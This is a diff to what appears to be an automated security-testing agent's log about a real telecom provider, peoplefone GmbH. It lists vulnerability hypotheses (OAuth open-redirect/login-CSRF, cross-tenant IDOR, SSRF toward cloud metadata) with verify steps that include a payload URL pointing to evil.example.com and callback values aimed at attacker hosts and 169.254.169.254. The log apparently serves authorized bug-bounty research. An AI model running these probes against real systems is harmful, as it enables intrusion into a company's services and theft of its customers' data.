@@ -2250,3 +2250,33 @@ testability: AUTH_HELPED
 [LEARN] REJECTED MISCONFIG @ *.peoplefone.com: unchanged — 19 guessed subdomains all NXDOMAIN, no wildcard, no dangling CNAME targets; reposcan yields no in-scope surface.
 [LEARN] REJECTED BUSLOGIC @ call-api queue agents: triage-formal INVALID (spec-silent on membership validation); removed from active set.
 [RISK] peoplefone GmbH: 83/100 — Up 1 on evidence closure, not risk reduction. Sole report-ready finding (OAuth open-redirect/login-CSRF, triage VALID 7.4/9.1 conditional) still not confirmed submitted (valid-bugs 0) after 36 frozen cycles. Configuration IDOR (85) + SSRF (78) remain live behind a bearer token proven unacquirable agent-side (all register locales → 500 fresh-probed; triage HOLDS). Both lever lines now collapse to a single human action path: report submission + (if register recovers) token minting. Risk drops only on a valid-bugs increment; no agent-side action remains available.
+## 2026-09-11 13:25:15 UTC [target] (model bigpickle)
+[HYP] OAuth open-redirect + login-CSRF on auth (client_id=1), cookie-seeded variant
+class: AUTH
+asset: auth.peoplefone.com/oauth/authorize (+ /oauth/token)
+confidence: 62
+reasoning: stateless authorize 404 but server-sets attacker redirect_uri cookie (httponly/secure, Max-Age 34560000, fresh re-verified); warm-session authorize 302→/de_CH/login preserves arbitrary redirect_uri with implicit+PKCE accepted; token endpoint enforces client-secret for clients 1/4/5 (401) and 500s nonexistent ids — code-theft exchange ATO falsified for known confidential clients; guaranteed primitive = open-redirect+login-CSRF; triage VALID 7.4 (9.1 conditional); Laravel debug sweep this cycle all 404 so no adjacent-auth bypass path
+evidence_needed: warm-session response_type=token with attacker redirect_uri yields access_token fragment; or cookie-seeded redirect consumes pre-seeded attacker value
+verify_steps: (authorized, human) warm portal session + authorize?client_id=1&response_type=token&redirect_uri=attacker; observe fragment; else submit as open-redirect+login-CSRF
+impact: silent ATO of portal users (recordings, CDR, PBX, billing, PII) if implicit; else open-redirect+login-CSRF; CRITICAL conditional
+testability: HUMAN_ONLY
+[HYP] Cross-tenant PBX takeover via Configuration API sequential identifier enumeration (8 resource types)
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
+confidence: 85
+reasoning: 235KB spec; numeric sequential ids; boundary statement present but enforcement unproven; UserResponse leaks sipUserName+email+address; live 401 gate; cross-model rank holds 36 cycles, zero counter-evidence
+evidence_needed: tenant-A bearer returns tenant-B {identifier} object via ±1 enumeration
+verify_steps: (authorized, read-only) GET /customer/voip/v1/users/{own_id±1}; repeat on /numbers/{did}, /callforwarding/{id}; compare tenant markers
+impact: cross-tenant PBX takeover — SIP creds, PII, DID routing, billing fraud; CRITICAL
+testability: AUTH_HELPED
+[HYP] Cloud metadata/IAM theft via 5 webhook/callback endpoints with zero host/scheme validation
+class: SSRF
+asset: api.peoplefone.com sms/callbackUrl + call-api smart-routings/{id}/webhook + uaCSTA callbackUrl/monitoringCallbackUrl + configuration-api external-number-lookup webhookUrl
+confidence: 78
+reasoning: format:uri with no enum/allowlist across 5 endpoints; External Number Lookup forwards Authorization/X-API-Key to attacker URL; deprecated External Routing (2026-09-30) repeats pattern; zero counter-evidence 36 cycles
+evidence_needed: post-auth callback reaches attacker host; 169.254.169.254/private ranges unfiltered
+verify_steps: (authorized) POST SMS callbackUrl=https://attacker/x and http://169.254.169.254/latest/meta-data/; inspect attacker-side receipt only
+impact: metadata/IAM theft, SIP/PBX internal pivot, call-metadata leak; CRITICAL
+testability: AUTH_HELPED
+[NEXT] HUMAN: Submit the OAuth open-redirect/login-CSRF finding to bugs.olivermaicher.eu — 36th frozen cycle, valid-bugs 0, and this cycle's breadth sweep (Laravel debug/`_ignition`/telescope/horizon/graphql/.env all 404|edge-403) closed the last remaining passive probe path on the token-gated estate. Payload: `GET /oauth/authorize?client_id=1&response_type=code&redirect_uri=https://evil.example.com/callback` → 404 + attacker `redirect_uri` cookie (httponly/secure, Max-Age 34560000, fresh re-verified); warm portal session 302→/de_CH/login preserves arbitrary redirect_uri. Report guaranteed open-redirect+login-CSRF impact; frame warm-session implicit-flow as unconfirmed silent-ATO escalation. Agent-side: no productive probes remain — all live surfaces (37 cycles incl. debug sweep) frozen; IDOR/SSRF stay triage-HOLD pending a human-minted bearer token.
+[RISK] peoplefone GmbH: 83/100 — Unchanged. This cycle adds evidence closure only: the last unprobed passive breadths (Laravel debug/dump/graphql surface on the token-gated estate) are clean 404s, so no new in-scope attack path exists and both CRITICAL API classes (IDOR 85, SSRF 78) remain irreducibly token-gated behind a minting lever proven permanently closed agent-side (register 500 global). Risk now moves exclusively on the single human action path: report submission of the triage-VALID OAuth open-redirect/login-CSRF (valid-bugs 0) and, if register recovers, token minting. No agent-side action remains available this or future cycles.
